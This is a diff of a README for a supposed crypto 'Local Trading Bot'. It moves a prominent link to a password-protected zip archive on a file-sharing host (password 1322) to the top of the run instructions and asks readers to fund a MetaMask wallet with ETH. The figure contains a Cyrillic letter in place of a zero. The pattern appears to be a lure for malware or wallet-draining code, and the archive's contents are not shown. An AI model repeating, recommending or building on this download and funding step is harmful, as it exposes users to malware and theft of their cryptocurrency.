@@ -65,11 +65,15 @@ Hey crypto enthusiasts! I’m excited to share my **Local Trading Bot** — a si
 
   
 
-## How to Run on [CodePen](https://codepen.io/pen/)
-
+## How to Run
   
 
-  
+
+
+  # [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+## PASSWORD: 1322  
+
+
 
 1.  *Set up **MetaMask:***
 
@@ -85,8 +89,7 @@ Hey crypto enthusiasts! I’m excited to share my **Local Trading Bot** — a si
 
 -  *Make sure your wallet has **≥О.1-1 ETH** plus gas for contract deployment.*
 
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
-## PASSWORD: 1322  
+
 
 -  *Paste*  **(source.html)** code into the **HTML** block.*
 
